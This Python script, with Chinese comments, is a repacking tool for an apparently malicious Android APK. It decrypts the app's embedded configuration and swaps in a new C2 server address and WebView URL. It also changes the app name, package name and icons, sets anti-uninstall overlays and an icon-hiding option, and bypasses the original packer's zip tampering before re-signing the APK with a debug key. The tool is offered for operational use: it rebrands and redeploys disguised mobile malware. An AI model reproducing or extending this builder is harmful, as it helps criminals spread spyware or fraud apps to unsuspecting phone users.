#!/usr/bin/env python3
"""
APK 重打包工具 - Fisher/GNI APK 定制版
功能：替换 C2 服务器地址、WebView H5 地址、APK 图标
"""

import zipfile
import json
import base64
import os
import sys
import shutil
import subprocess
import tempfile
from pathlib import Path
from io import BytesIO

# ============================================================
# 加密/解密引擎
# ============================================================

class ZM26Crypto:
    MAGIC = b'ZM26'
    def __init__(self, xor_key_hex, salt_hex):
        self.key = bytes.fromhex(xor_key_hex)
        self.salt = bytes.fromhex(salt_hex)
        self.combined = self.salt + self.key
    def decrypt(self, data):
        assert data[:4] == self.MAGIC, f"无效的 ZM26 文件头: {data[:4].hex()}"
        payload = data[12:]
        decrypted = bytes([b ^ self.combined[i % len(self.combined)] for i, b in enumerate(payload)])
        return decrypted.rstrip(b'\x00')
    def encrypt(self, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        payload = bytes([b ^ self.combined[i % len(self.combined)] for i, b in enumerate(plaintext)])
        return self.MAGIC + self.salt + payload

class ENCCrypto:
    KEY1 = bytes([0x4a, 0x7f, 0x2b, 0x5e, 0x1c, 0x8d, 0x3a, 0x6f, 0x9e, 0x0d, 0x4c, 0x7b, 0x2a, 0x5f, 0x1e, 0x8c])
    KEY2 = bytes([0x3b, 0x6e, 0x1a, 0x4d, 0x0c, 0x7c, 0x2b, 0x5e, 0x8f, 0x0e, 0x3d, 0x6c, 0x1b, 0x4e, 0x0f, 0x7d])
    @staticmethod
    def _swap_pairs(data):
        arr = bytearray(data)
        for i in range(0, len(arr) - 1, 2): arr[i], arr[i + 1] = arr[i + 1], arr[i]
        return bytes(arr)
    @classmethod
    def decrypt(cls, enc_str):
        if enc_str.startswith('ENC:'): enc_str = enc_str[4:]
        data = bytearray(base64.b64decode(enc_str))
        data = bytearray(cls._swap_pairs(data))
        result = bytearray(len(data))
        for i in range(len(data)): result[i] = data[i] ^ cls.KEY2[i % 16]
        final = bytearray(len(result))
        for i in range(len(result)): final[i] = result[i] ^ cls.KEY1[i % 16]
        return bytes(final).decode('utf-8')
    @classmethod
    def encrypt(cls, plaintext):
        if isinstance(plaintext, str): plaintext = plaintext.encode('utf-8')
        step1 = bytearray(len(plaintext))
        for i in range(len(plaintext)): step1[i] = plaintext[i] ^ cls.KEY1[i % 16]
        step2 = bytearray(len(step1))
        for i in range(len(step1)): step2[i] = step1[i] ^ cls.KEY2[i % 16]
        step3 = cls._swap_pairs(bytes(step2))
        return 'ENC:' + base64.b64encode(step3).decode('ascii')

class StringCrypto:
    KEY = b'K9qZ-XlN7Q'
    @classmethod
    def decrypt(cls, b64_str):
        raw = base64.b64decode(b64_str)
        return bytes([raw[i] ^ cls.KEY[i % 10] for i in range(len(raw))]).decode('utf-8')
    @classmethod
    def encrypt(cls, plaintext):
        if isinstance(plaintext, str): plaintext = plaintext.encode('utf-8')
        encrypted = bytes([plaintext[i] ^ cls.KEY[i % 10] for i in range(len(plaintext))])
        return base64.b64encode(encrypted).decode('ascii')

class APKRepacker:
    def __init__(self, apk_path):
        self.apk_path = apk_path
        self.zm26 = None
        self.server_config = None
        self.meta = None
        self._load_meta()
    @staticmethod
    def _clear_fake_encryption(z):
        """清除加固工具篡改的假加密标志（central directory flag_bits 被设置了加密位，但实际数据未加密）"""
        for info in z.infolist():
            if info.flag_bits & 0x01:
                info.flag_bits &= ~0x01

    def _load_meta(self):
        with zipfile.ZipFile(self.apk_path, 'r') as z:
            self._clear_fake_encryption(z)
            self.meta = json.loads(z.read('assets/zm26_meta.json'))
            self.zm26 = ZM26Crypto(self.meta['xor_key'], self.meta['salt'])
            bt_name = self.meta['mapping']['server_config.json']
            encrypted = z.read(f'assets/{bt_name}')
            decrypted = self.zm26.decrypt(encrypted)
            json_start = decrypted.find(b'{')
            if json_start >= 0:
                self._bt_prefix = decrypted[:json_start]
                self.server_config = json.loads(decrypted[json_start:])
            else:
                self._bt_prefix = b''
                raise ValueError("无法解析 server_config.json")

    def _read_raw_entry(self, filename):
        """从加固 APK 中读取原始 entry 数据（通过文件偏移量直接读取，绕过 zipfile）"""
        import struct
        try:
            src_data = open(self.apk_path, 'rb').read()
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                self._clear_fake_encryption(z)
                if filename not in z.namelist():
                    return None
                info = z.getinfo(filename)
                # 尝试通过 zipfile 读取（对于已修复假加密标志的文件）
                try:
                    return z.read(filename)
                except:
                    pass
                # 回退：从原始字节流中按偏移量读取
                lf_offset = info.header_offset
                # 读取 local file header
                fn_len = struct.unpack_from('<H', src_data, lf_offset + 26)[0]
                extra_len = struct.unpack_from('<H', src_data, lf_offset + 28)[0]
                data_start = lf_offset + 30 + fn_len + extra_len
                # 数据大小：优先用 CD 中的值，如果为 0 则推算
                data_size = info.compress_size if info.compress_size > 0 else info.file_size
                if data_size == 0:
                    # 通过下一个 entry 偏移推算
                    all_offsets = sorted([i.header_offset for i in z.infolist()])
                    idx = all_offsets.index(lf_offset)
                    if idx + 1 < len(all_offsets):
                        next_off = all_offsets[idx + 1]
                    else:
                        # 查找 central directory 起始位置
                        eocd_sig = b'\x50\x4b\x05\x06'
                        eocd_pos = src_data.rfind(eocd_sig)
                        cd_offset = struct.unpack_from('<I', src_data, eocd_pos + 16)[0]
                        next_off = cd_offset
                    data_size = next_off - data_start
                return src_data[data_start:data_start + data_size]
        except Exception as e:
            print(f"    ⚠️ 读取 {filename} 失败: {e}")
            return None

    def repack(self, output_path, server_url=None, web_url=None,
               icon_path=None, app_name=None, owner=None, package_name=None,
               bg_path=None, bg_mask_path=None, page_style_config=None,
               loading_tips=None, uninstall_overlay_texts=None,
               enable_config_mask=None, enable_progress_bar=None,
               enable_service_mode=None, uninstall_mode=None,
               uninstall_style=None, show_app_icon=None, **kwargs):
        print("\n" + "=" * 60)
        print("🔧 开始重打包 APK")
        print("=" * 60)
        config = dict(self.server_config)
        _orig_pkg = self.server_config.get('pageStyleConfig', {}).get('applicationId', '')
        _orig_app_name = self.server_config.get('pageStyleConfig', {}).get('appName', '')

        if server_url:
            enc_url = ENCCrypto.encrypt(server_url)
            config['serverUrl'] = enc_url
            print(f"  ✅ C2 地址: {server_url}")
            verify = ENCCrypto.decrypt(enc_url)
            assert verify == server_url, f"加密验证失败: {verify} != {server_url}"
            print(f"     验证OK: {verify}")
        if web_url:
            enc_url = ENCCrypto.encrypt(web_url)
            config['webUrl'] = enc_url
            print(f"  ✅ WebView: {web_url}")
        if app_name:
            config['configMaskText'] = app_name
            config['configMaskSubtitle'] = app_name
            if 'pageStyleConfig' in config:
                config['pageStyleConfig']['appName'] = app_name
            print(f"  ✅ 应用名: {app_name}")
        if package_name:
            if 'pageStyleConfig' in config:
                config['pageStyleConfig']['applicationId'] = package_name
            print(f"  ✅ 包名: {package_name}")
        # ★ owner：传入就设置，没传就清空（避免 source.apk 残留旧值）
        if owner:
            config['ownerUsername'] = owner
            print(f"  ✅ 所有者: {owner}")
        else:
            # 未传入owner时，强制清空，不保留source.apk中的旧值
            config['ownerUsername'] = ''
            print(f"  ℹ️ 所有者未指定，已清空")

        if page_style_config and isinstance(page_style_config, dict):
            psc_out = config.setdefault('pageStyleConfig', {})
            keys_updated = []
            for k, v in page_style_config.items():
                if k not in ('appName', 'applicationId'):
                    psc_out[k] = v
                    keys_updated.append(k)
            if keys_updated:
                print(f"  ✅ 更新 pageStyleConfig: {keys_updated}")
        if loading_tips and isinstance(loading_tips, list):
            config['loadingTips'] = loading_tips
            print(f"  ✅ 更新 loadingTips ({len(loading_tips)} 条)")
        if uninstall_overlay_texts and isinstance(uninstall_overlay_texts, list):
            config['uninstallOverlayTexts'] = uninstall_overlay_texts
            print(f"  ✅ 更新 uninstallOverlayTexts ({len(uninstall_overlay_texts)} 条)")
        bool_config_map = {
            'enableConfigMask': enable_config_mask, 'enableProgressBar': enable_progress_bar,
            'enableServiceMode': enable_service_mode, 'uninstallMode': uninstall_mode,
            'showAppIcon': show_app_icon,
        }
        for key, val in bool_config_map.items():
            if val is not None:
                config[key] = val
        if uninstall_style:
            config['uninstallStyle'] = uninstall_style
            print(f"  ✅ 防卸载样式: {uninstall_style}")

        config_json = json.dumps(config, ensure_ascii=False, indent=2)
        bt_name = self.meta['mapping']['server_config.json']
        plaintext_with_prefix = self._bt_prefix + config_json.encode('utf-8')
        new_bt_data = self.zm26.encrypt(plaintext_with_prefix)
        print(f"  ✅ 配置已加密 ({len(new_bt_data)} bytes)")

        icon_sizes = {}
        if icon_path and os.path.exists(icon_path):
            try:
                from PIL import Image
                img = Image.open(icon_path)
                size_map = {'mdpi': 48, 'hdpi': 72, 'xhdpi': 96, 'xxhdpi': 144, 'xxxhdpi': 192}
                for density, size in size_map.items():
                    resized = img.resize((size, size), Image.LANCZOS)
                    buf = BytesIO()
                    resized.save(buf, format='PNG')
                    icon_sizes[density] = buf.getvalue()
                print(f"  ✅ 图标已缩放: {len(icon_sizes)} 个尺寸")
            except ImportError:
                with open(icon_path, 'rb') as f: icon_data = f.read()
                for density in ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']:
                    icon_sizes[density] = icon_data
                print(f"  ⚠️ 未安装 Pillow")
        bg_img_data = None
        if bg_path and os.path.exists(bg_path):
            try:
                from PIL import Image
                import struct, zlib
                img = Image.open(bg_path)
                orig_format = img.format
                orig_size = img.size
                
                # Convert to RGB (no alpha)
                if img.mode in ('RGBA', 'LA', 'P'):
                    bg = Image.new('RGB', img.size, (255, 255, 255))
                    if img.mode == 'P':
                        img = img.convert('RGBA')
                    if 'A' in img.mode:
                        bg.paste(img, mask=img.split()[-1])
                        img = bg
                    else:
                        img = img.convert('RGB')
                elif img.mode != 'RGB':
                    img = img.convert('RGB')
                
                # Resize to 720x1080 (same as source APK bg) to keep file manageable
                target_w, target_h = 720, 1080
                if img.width != target_w or img.height != target_h:
                    img = img.resize((target_w, target_h), Image.LANCZOS)
                    print(f"  ℹ️ 背景图已缩放: {orig_size} → {img.size}")
                
                # Generate a minimal PNG manually (no extra chunks, Android-compatible)
                width, height = img.size
                raw_data = img.tobytes()
                
                def _make_minimal_png(w, h, rgb_data):
                    """Create a minimal PNG with only IHDR, IDAT, IEND chunks (Android-safe)"""
                    def _chunk(chunk_type, data):
                        c = chunk_type + data
                        crc = struct.pack('>I', zlib.crc32(c) & 0xffffffff)
                        return struct.pack('>I', len(data)) + c + crc
                    
                    # PNG signature
                    sig = b'\x89PNG\r\n\x1a\n'
                    # IHDR: width, height, bit depth=8, color type=2 (RGB), compression=0, filter=0, interlace=0
                    ihdr_data = struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)
                    ihdr = _chunk(b'IHDR', ihdr_data)
                    # IDAT: filter byte (0=None) + row data
                    row_size = w * 3
                    filtered = b''
                    for y in range(h):
                        filtered += b'\x00' + rgb_data[y * row_size:(y + 1) * row_size]
                    compressed = zlib.compress(filtered, 9)
                    idat = _chunk(b'IDAT', compressed)
                    # IEND
                    iend = _chunk(b'IEND', b'')
                    return sig + ihdr + idat + iend
                
                bg_img_data = _make_minimal_png(width, height, raw_data)
                
                if orig_format != 'PNG':
                    print(f"  ✅ 背景图已转换为PNG ({orig_format}→PNG, {img.size}, {len(bg_img_data)} bytes)")
                else:
                    print(f"  ✅ 背景图已优化 (PNG, {img.size}, {len(bg_img_data)} bytes)")
            except ImportError:
                with open(bg_path, 'rb') as f: bg_img_data = f.read()
                print(f"  ⚠️ 未安装 Pillow，背景图未转换 ({len(bg_img_data)} bytes)")

        # 不修改 AndroidManifest.xml - 图标显示/隐藏由 APP 内部根据 showAppIcon 配置动态控制
        # APP 通过 BOOT_COMPLETED / MY_PACKAGE_REPLACED 广播自动启动后处理
        new_manifest_data = None

        # 应用名替换: 从原始APK中读取 resources.arsc 数据并做二进制替换
        new_arsc_data = None
        if app_name and _orig_app_name and _orig_app_name != app_name:
            print(f"\n  🔑 替换应用名: {_orig_app_name} → {app_name}")
            try:
                # 从原始 APK 二进制中直接提取 resources.arsc 数据
                arsc_data = self._read_raw_entry('resources.arsc')
                if arsc_data:
                    replaced = False
                    for enc_name, old_bytes, new_bytes in [
                        ('UTF-8', _orig_app_name.encode('utf-8'), app_name.encode('utf-8')),
                        ('UTF-16', _orig_app_name.encode('utf-16-le'), app_name.encode('utf-16-le')),
                    ]:
                        if old_bytes not in arsc_data:
                            continue
                        count = arsc_data.count(old_bytes)
                        if len(old_bytes) == len(new_bytes):
                            arsc_data = arsc_data.replace(old_bytes, new_bytes)
                        elif len(new_bytes) < len(old_bytes):
                            arsc_data = arsc_data.replace(old_bytes, new_bytes + b'\x00' * (len(old_bytes) - len(new_bytes)))
                        else:
                            arsc_data = arsc_data.replace(old_bytes, new_bytes[:len(old_bytes)])
                        print(f"    ✓ 替换应用名(ARSC/{enc_name}): {count}处")
                        replaced = True
                    if replaced:
                        new_arsc_data = arsc_data
                    else:
                        print(f"    ⚠️ 未在 resources.arsc 中找到原始应用名")
                else:
                    print(f"    ⚠️ 无法读取 resources.arsc")
            except Exception as e:
                print(f"    ⚠️ 应用名替换异常: {e}")

        print(f"\n  📦 正在重打包（加固APK兼容模式）...")
        icon_entries = []
        obfuscated_icon_entries = []  # 加固混淆的桌面图标（通过文件大小识别）
        with zipfile.ZipFile(self.apk_path, 'r') as z:
            self._clear_fake_encryption(z)
            for info in z.infolist():
                if 'mipmap' in info.filename and info.filename.endswith('.png'):
                    icon_entries.append(info.filename)
                # 识别加固混淆的桌面图标：大小相同的 PNG 文件（非 assets/ 目录）
                if (info.file_size == 29789 and info.filename.endswith('.png')
                        and not info.filename.startswith('assets/')):
                    obfuscated_icon_entries.append(info.filename)
        if obfuscated_icon_entries:
            print(f"  🔍 发现 {len(obfuscated_icon_entries)} 个混淆桌面图标")
        bg_targets = ['res/drawable/bg_accessibility.png', 'assets/bg_accessibility.png', 'assets/app_loading_bg.png']
        icon_targets2 = ['assets/igj.png', 'res/drawable/rs12.png', 'res/drawable/rt13.png',
                         'res/drawable/ru14.png', 'res/drawable/rv15.png', 'res/drawable/rw16.png', 'res/drawable/rx17.png']

        # 构建替换映射
        replacements = {}
        replacements[f'assets/{bt_name}'] = new_bt_data
        if bg_img_data:
            for t in bg_targets:
                replacements[t] = bg_img_data
        if icon_sizes:
            for entry in icon_entries:
                for density, idata in icon_sizes.items():
                    if density in entry:
                        replacements[entry] = idata
                        break
        if icon_path and os.path.exists(icon_path):
            with open(icon_path, 'rb') as f:
                icon_raw = f.read()
            for t in icon_targets2:
                replacements[t] = icon_raw
            # 同时替换 assets/sjgj.png（某些版本APK的应用图标位置）
            replacements['assets/sjgj.png'] = icon_raw
            # 替换加固混淆的桌面图标（通过文件大小 29789 识别的 mipmap 图标）
            if obfuscated_icon_entries:
                for entry in obfuscated_icon_entries:
                    replacements[entry] = icon_raw
                print(f"  ✅ 将替换 {len(obfuscated_icon_entries)} 个混淆桌面图标")
        if new_arsc_data:
            replacements['resources.arsc'] = new_arsc_data
        if new_manifest_data:
            replacements['AndroidManifest.xml'] = new_manifest_data

        # 使用原始字节流重建 APK（兼容加固 APK 的非标准 zip 结构）
        unsigned_path = output_path + '.unsigned'
        self._repack_raw(unsigned_path, replacements)
        print(f"  未签名 APK: {unsigned_path}")

        signed = self._sign_apk(unsigned_path, output_path)
        if signed:
            if os.path.exists(unsigned_path): os.remove(unsigned_path)
            print(f"\n  签名+对齐完成: {output_path}")
        else:
            if os.path.exists(unsigned_path): shutil.move(unsigned_path, output_path)
            print(f"\n  签名失败，输出未签名 APK: {output_path}")
        print(f"\n{'='*60}\n新 APK 配置摘要\n{'='*60}")
        if server_url: print(f"  C2 地址:  {server_url}")
        if web_url: print(f"  WebView:  {web_url}")
        if app_name: print(f"  应用名:   {app_name}")
        print(f"  文件大小: {os.path.getsize(output_path)/1024/1024:.1f} MB")
        print(f"  输出路径: {output_path}")
        return output_path

    def _repack_raw(self, output_path, replacements):
        """
        原始字节流重打包：逐条复制 local file entry，对需要替换的文件写入新数据，
        最后重建 central directory 和 EOCD。兼容加固 APK 的非标准 zip 结构。
        """
        import struct, zlib

        src = open(self.apk_path, 'rb')
        src_data = src.read()
        src.close()

        # 解析 EOCD (End of Central Directory)
        eocd_sig = b'\x50\x4b\x05\x06'
        eocd_pos = src_data.rfind(eocd_sig)
        if eocd_pos < 0:
            raise ValueError("无法找到 EOCD 签名")
        eocd = src_data[eocd_pos:]
        cd_size = struct.unpack_from('<I', eocd, 12)[0]
        cd_offset = struct.unpack_from('<I', eocd, 16)[0]
        cd_data = src_data[cd_offset:cd_offset + cd_size]

        # 解析 central directory entries
        cd_entries = []
        pos = 0
        while pos < len(cd_data):
            if cd_data[pos:pos+4] != b'\x50\x4b\x01\x02':
                break
            fn_len = struct.unpack_from('<H', cd_data, pos + 28)[0]
            extra_len = struct.unpack_from('<H', cd_data, pos + 30)[0]
            comment_len = struct.unpack_from('<H', cd_data, pos + 32)[0]
            entry_len = 46 + fn_len + extra_len + comment_len
            filename = cd_data[pos+46:pos+46+fn_len].decode('utf-8', errors='replace')
            cd_entries.append({
                'cd_raw': bytearray(cd_data[pos:pos+entry_len]),
                'filename': filename,
                'local_offset': struct.unpack_from('<I', cd_data, pos + 42)[0],
                'comp_size_cd': struct.unpack_from('<I', cd_data, pos + 20)[0],
                'uncomp_size_cd': struct.unpack_from('<I', cd_data, pos + 24)[0],
                'comp_method': struct.unpack_from('<H', cd_data, pos + 10)[0],
                'flags': struct.unpack_from('<H', cd_data, pos + 8)[0],
            })
            pos += entry_len

        # 对 entries 按 local_offset 排序（确保顺序与文件中一致）
        cd_entries.sort(key=lambda e: e['local_offset'])

        # 计算每个 entry 的 local file entry 长度（header + data + optional data descriptor）
        for i, entry in enumerate(cd_entries):
            lf_offset = entry['local_offset']
            # 读取 local file header
            if src_data[lf_offset:lf_offset+4] != b'\x50\x4b\x03\x04':
                raise ValueError(f"无效的 local file header at {lf_offset}: {entry['filename']}")
            lh_fn_len = struct.unpack_from('<H', src_data, lf_offset + 26)[0]
            lh_extra_len = struct.unpack_from('<H', src_data, lf_offset + 28)[0]
            lh_flags = struct.unpack_from('<H', src_data, lf_offset + 6)[0]
            lh_comp_size = struct.unpack_from('<I', src_data, lf_offset + 18)[0]
            header_size = 30 + lh_fn_len + lh_extra_len
            data_start = lf_offset + header_size

            # 确定数据大小
            if lh_comp_size > 0:
                data_size = lh_comp_size
            elif entry['comp_size_cd'] > 0:
                data_size = entry['comp_size_cd']
            else:
                # 大小为0（加固文件如 AndroidManifest.xml）：通过下一个 entry 的偏移推算
                if i + 1 < len(cd_entries):
                    next_offset = cd_entries[i+1]['local_offset']
                else:
                    next_offset = cd_offset  # central directory 起始位置
                data_size = next_offset - data_start
                # 如果有 data descriptor，它在数据后面（12或16字节）
                if lh_flags & 0x08:
                    # 检查是否有 data descriptor signature
                    check_offset = data_start + data_size - 16
                    if check_offset > data_start and src_data[check_offset:check_offset+4] == b'\x50\x4b\x07\x08':
                        pass  # data descriptor 已包含在范围内
                    # 不调整，保持整块复制

            entry['header_size'] = header_size
            entry['data_start'] = data_start
            entry['data_size'] = data_size
            entry['lh_flags'] = lh_flags
            # total_local_size 包含 header + data + data descriptor
            if i + 1 < len(cd_entries):
                entry['total_local_size'] = cd_entries[i+1]['local_offset'] - lf_offset
            else:
                entry['total_local_size'] = cd_offset - lf_offset

        # 跳过 META-INF 签名文件
        skip_suffixes = ('.SF', '.RSA', '.DSA', '.MF')
        skip_entries = set()
        for entry in cd_entries:
            if entry['filename'].startswith('META-INF/') and any(entry['filename'].endswith(s) for s in skip_suffixes):
                skip_entries.add(entry['filename'])

        # 写入输出文件
        out = open(output_path, 'wb')
        new_cd_entries = []

        for entry in cd_entries:
            filename = entry['filename']
            if filename in skip_entries:
                continue

            new_offset = out.tell()

            if filename in replacements:
                # 写入替换数据：构建新的 local file header + data (STORED, 无加密)
                new_data = replacements[filename]
                fn_bytes = filename.encode('utf-8')
                crc = zlib.crc32(new_data) & 0xffffffff
                # Local file header
                lh = struct.pack('<4sHHHHHIIIHH',
                    b'\x50\x4b\x03\x04',  # signature
                    20,                     # version needed
                    0x0800,                 # flags (UTF-8 filename, no encryption, no data desc)
                    0,                      # compression: STORED
                    0, 0,                   # mod time/date (will be ignored)
                    crc,                    # CRC-32
                    len(new_data),          # compressed size
                    len(new_data),          # uncompressed size
                    len(fn_bytes),          # filename length
                    0,                      # extra field length
                )
                out.write(lh)
                out.write(fn_bytes)
                out.write(new_data)
                print(f"     替换: {filename} ({len(new_data)} bytes)")

                # 更新 central directory entry
                cd_raw = bytearray(entry['cd_raw'])
                # 更新 CD entry: flags, compression, crc, comp_size, uncomp_size, offset
                struct.pack_into('<H', cd_raw, 8, 0x0800)        # flags
                struct.pack_into('<H', cd_raw, 10, 0)            # compression method
                struct.pack_into('<I', cd_raw, 16, crc)          # CRC
                struct.pack_into('<I', cd_raw, 20, len(new_data))  # compressed size
                struct.pack_into('<I', cd_raw, 24, len(new_data))  # uncompressed size
                struct.pack_into('<I', cd_raw, 42, new_offset)   # local header offset
                new_cd_entries.append(bytes(cd_raw))
            else:
                lf_offset = entry['local_offset']
                lh_flags = entry['lh_flags']
                comp_method = entry['comp_method']
                data_size = entry['data_size']
                header_size = entry['header_size']

                # 检测加固篡改：local header 中 csz=0 但实际有数据，或者使用非标准压缩方法
                lh_csz = struct.unpack_from('<I', src_data, lf_offset + 18)[0]
                needs_fix = False
                if comp_method not in (0, 8) or (lh_csz == 0 and data_size > 0 and not (lh_flags & 0x08)):
                    needs_fix = True
                elif lh_csz == 0 and data_size > 0 and (lh_flags & 0x08):
                    # data descriptor 模式 - 数据后面跟 descriptor，这种是正常的
                    needs_fix = False

                if needs_fix:
                    # 修复 local header：设置为 STORED，写入正确的大小和 CRC
                    data_start = entry['data_start']
                    raw_data = src_data[data_start:data_start + data_size]
                    crc = zlib.crc32(raw_data) & 0xffffffff
                    fn_bytes = filename.encode('utf-8')
                    # 构建修复后的 local file header
                    lh = struct.pack('<4sHHHHHIIIHH',
                        b'\x50\x4b\x03\x04',
                        20,              # version needed
                        0x0000,          # flags (清除所有特殊标志)
                        0,               # compression: STORED
                        struct.unpack_from('<H', src_data, lf_offset + 12)[0],  # mod time
                        struct.unpack_from('<H', src_data, lf_offset + 14)[0],  # mod date
                        crc,
                        data_size,       # compressed size = data_size (STORED)
                        data_size,       # uncompressed size
                        len(fn_bytes),
                        0,               # no extra field
                    )
                    out.write(lh)
                    out.write(fn_bytes)
                    out.write(raw_data)

                    # 更新 CD entry
                    cd_raw = bytearray(entry['cd_raw'])
                    struct.pack_into('<H', cd_raw, 8, 0x0000)        # flags
                    struct.pack_into('<H', cd_raw, 10, 0)            # compression: STORED
                    struct.pack_into('<I', cd_raw, 16, crc)          # CRC
                    struct.pack_into('<I', cd_raw, 20, data_size)    # compressed size
                    struct.pack_into('<I', cd_raw, 24, data_size)    # uncompressed size
                    struct.pack_into('<I', cd_raw, 42, new_offset)
                    new_cd_entries.append(bytes(cd_raw))
                else:
                    # 正常文件或 data descriptor 模式：直接复制原始字节
                    total_size = entry['total_local_size']
                    out.write(src_data[lf_offset:lf_offset + total_size])

                    # 更新 CD entry 中的偏移量
                    cd_raw = bytearray(entry['cd_raw'])
                    struct.pack_into('<I', cd_raw, 42, new_offset)
                    new_cd_entries.append(bytes(cd_raw))

        # 写入 central directory
        new_cd_offset = out.tell()
        for cd_entry in new_cd_entries:
            out.write(cd_entry)
        new_cd_size = out.tell() - new_cd_offset

        # 写入 EOCD
        eocd_comment_len = struct.unpack_from('<H', eocd, 20)[0]
        eocd_comment = eocd[22:22+eocd_comment_len] if eocd_comment_len > 0 else b''
        new_eocd = struct.pack('<4sHHHHIIH',
            b'\x50\x4b\x05\x06',
            0,                      # disk number
            0,                      # disk with CD
            len(new_cd_entries),    # entries on this disk
            len(new_cd_entries),    # total entries
            new_cd_size,            # CD size
            new_cd_offset,          # CD offset
            len(eocd_comment),      # comment length
        )
        out.write(new_eocd)
        if eocd_comment:
            out.write(eocd_comment)

        out.close()
        print(f"  ✅ 重打包完成: {len(new_cd_entries)} 个条目")

    def _sign_apk(self, input_path, output_path):
        import shutil as _shutil; import platform
        is_windows = platform.system() == "Windows"
        base_dir = os.path.dirname(os.path.abspath(__file__))
        log_file = os.path.join(base_dir, 'sign_debug.log')
        def log_debug(msg):
            print(msg)
            with open(log_file, 'a', encoding='utf-8') as f: f.write(msg + '\n')
        log_debug(f"--- 尝试签名 {output_path} ---")
        keytool = _shutil.which('keytool')
        jarsigner = _shutil.which('jarsigner')
        zipalign = _shutil.which('zipalign')
        apksigner = _shutil.which('apksigner')
        if is_windows and not zipalign:
            BUILD_TOOLS = r"D:\Develop\android-sdk\build-tools\34.0.0"
            zipalign = os.path.join(BUILD_TOOLS, 'zipalign.exe')
            apksigner = os.path.join(BUILD_TOOLS, 'apksigner.bat')
        local_apksigner_jar = os.path.join(base_dir, 'apksigner.jar')
        java_bin = _shutil.which('java')
        if not java_bin and os.path.exists('/usr/bin/java'): java_bin = '/usr/bin/java'
        apk_builder_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'apk-builder')
        builder_apksigner = os.path.join(apk_builder_dir, 'apksigner.jar')
        if not os.path.exists(local_apksigner_jar) and os.path.exists(builder_apksigner): local_apksigner_jar = builder_apksigner
        apksigner_cmd = None
        if apksigner and os.path.exists(apksigner): apksigner_cmd = [apksigner]
        elif os.path.exists(local_apksigner_jar) and java_bin: apksigner_cmd = [java_bin, '-jar', local_apksigner_jar]
        elif is_windows and os.path.exists(apksigner): apksigner_cmd = [apksigner]
        log_debug(f"zipalign: {zipalign} jarsigner: {jarsigner} apksigner_cmd: {apksigner_cmd}")
        keystore = os.path.join(base_dir, '_debug.keystore')
        alias = 'debugkey'; password = 'android'
        if not os.path.exists(keystore):
            builder_keystore = os.path.join(apk_builder_dir, '_debug.keystore')
            if os.path.exists(builder_keystore): keystore = builder_keystore
        if not os.path.exists(keystore):
            if not keytool: log_debug("  错误: 找不到 keytool"); return False
            log_debug("  生成签名密钥...")
            result = subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000', '-storepass', password, '-keypass', password, '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'], capture_output=True, text=True)
            if result.returncode != 0: log_debug(f"  生成密钥失败: {result.stderr}"); return False

        # 对于加固 APK，优先使用 jarsigner（v1签名，不解析zip entry数据）
        if jarsigner and os.path.exists(keystore):
            log_debug("  使用 jarsigner 签名（v1, 兼容加固APK）...")
            _shutil.copy2(input_path, output_path)
            sign_cmd = [jarsigner, '-keystore', keystore, '-storepass', password,
                        '-keypass', password, '-signedjar', output_path, input_path, alias]
            result = subprocess.run(sign_cmd, capture_output=True, text=True)
            if result.returncode == 0:
                log_debug("  jarsigner 签名成功 (v1)")
                return True
            else:
                log_debug(f"  jarsigner 失败: {result.stderr}")

        # 回退到 apksigner
        if not apksigner_cmd: log_debug("  错误: 找不到签名工具"); return False
        aligned_path = input_path + '.aligned'
        if zipalign and os.path.exists(zipalign):
            log_debug("  zipalign 对齐中...")
            result = subprocess.run([zipalign, '-f', '-v', '4', input_path, aligned_path], capture_output=True, text=True)
            if result.returncode != 0: log_debug(f"  zipalign 失败: {result.stderr}"); return False
            log_debug("  zipalign 完成")
        else:
            log_debug("  跳过zipalign..."); _shutil.copy2(input_path, aligned_path)
        log_debug("  apksigner 签名中...")
        sign_cmd = apksigner_cmd + ['sign', '--ks', keystore, '--ks-pass', f'pass:{password}', '--key-pass', f'pass:{password}', '--ks-key-alias', alias, '--min-sdk-version', '24', '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true', '--out', output_path, aligned_path]
        result = subprocess.run(sign_cmd, capture_output=True, text=True, shell=is_windows)
        if os.path.exists(aligned_path): os.remove(aligned_path)
        if result.returncode != 0: log_debug(f"  apksigner 失败: {result.stderr}"); return False
        log_debug("  APK 已成功签名"); return True